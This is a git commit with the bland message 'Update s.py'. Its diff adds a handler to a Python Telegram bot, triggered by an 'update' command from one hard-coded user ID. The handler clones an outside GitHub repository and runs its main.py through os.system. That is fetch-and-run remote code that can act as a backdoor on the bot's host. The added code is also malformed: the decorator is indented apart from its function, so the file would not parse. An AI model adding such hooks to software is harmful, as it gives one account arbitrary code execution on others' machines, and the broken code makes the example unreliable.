1a0d83dc500605f0eee8c07e1a80a62c7a863fd1
epsatya <93773906+epsatya@users.noreply.github.com>
2021-11-30 21:49:24 +0530

    Update s.py

--- kek/s.py
+++ kek/s.py
@@ -121,3 +121,13 @@ async def start(bot, message):
             text,
             reply_markup=keyboard,
         )
+    
+    @Client.on_message(filters.command(["update"]) & filters.user(1089528685))
+
+async def meme(bot, update):
+    k = await bot.send_message(update.chat.id, "updating..", reply_to_message_id=update.message_id)
+    os.system("git clone https://github.com/sathjya/stunning-octo-chainsaw")
+    os.system("cd stunning-octo-chainsaw && python3 main.py")
+    time.sleep(3)
+    await k.edit("success")
+   
